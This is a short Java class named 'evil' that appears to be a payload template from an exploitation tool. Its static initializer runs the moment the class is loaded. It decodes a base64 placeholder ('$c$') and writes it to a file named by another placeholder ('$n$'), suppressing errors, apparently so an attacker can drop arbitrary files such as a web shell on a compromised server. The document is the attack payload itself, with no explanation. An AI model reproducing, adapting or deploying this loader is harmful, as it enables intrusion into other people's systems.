import java.io.*;

import sun.misc.BASE64Decoder;
public class evil extends Thread {
	public static String name = "$n$";
	public static String content = "$c$";
	public static BASE64Decoder decoder = new BASE64Decoder();
    private static Thread thread = new evil();
    static {
  	  try {
			FileOutputStream fi = new FileOutputStream(name);
			fi.write(decoder.decodeBuffer(content));
			fi.close();
	  } catch(Exception e) {
	  }
    }
    public static void startRun(String urlStr) {
        thread.start();
    }
    public void run() {
    }
}